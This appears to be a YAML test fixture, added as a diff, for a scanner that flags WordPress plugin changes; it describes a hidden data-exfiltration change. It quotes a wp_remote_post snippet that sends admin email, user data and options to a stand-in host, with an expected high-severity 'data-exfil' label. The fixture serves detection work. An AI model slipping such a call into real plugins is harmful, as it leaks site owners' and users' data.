@@ -1,0 +1,11 @@
+eco: wp-plugin
+note: 'b02: admin_email, user emails and options posted to a new host on init'
+meta_old:
+  ref:
+    version: 1.0.0
+features_old: []
+features_new:
+- {kind: send, key: wp_remote_post, path: includes/stats.php, line: 22, attrs: {host: collect.stats-cdn.test, reads: 'admin_email,users,options'},
+  snippet: 'wp_remote_post( ''https://collect.stats-cdn.test/i'', array( ''body'' => $payload ) )'}
+expect:
+- {id: data-exfil, min_severity: high}
